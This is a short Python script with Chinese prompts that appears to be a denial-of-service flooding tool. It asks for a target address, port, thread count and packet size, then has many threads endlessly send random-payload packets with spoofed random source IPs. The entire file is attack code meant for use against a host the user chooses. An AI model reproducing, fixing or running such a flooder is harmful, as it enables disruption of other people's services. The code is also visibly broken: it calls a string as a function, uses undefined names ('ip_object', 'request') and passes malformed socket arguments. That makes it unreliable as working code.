import random, socket, threading

ip = str(input("地址："))
port = int(input("端口："))
threads = int(input("线程数："))
bit =int(input("包大小："))

def run():
    data = random._urandom(bit)
    while True:
        try:
            src="%i.%i.%i.%i"%(
                random.randint(1,255),
                random.randint(1, 255),
                random.randint(1, 255),
                random.randint(1, 255)
                )
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM,socket.SOCK_RAW,socket.IPPROTO_RAW)
            s.connect((ip,port))
            while True:
                src_host = src
                ipobj = ip(src_host)
                iph = ip_object.pack()
                packet = iph + data
                s.send(packet)
                s.send(str.encode(request))
            print(f"成功发送=> {ip}")
        except :
            print(f"发送失败 => {ip}")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
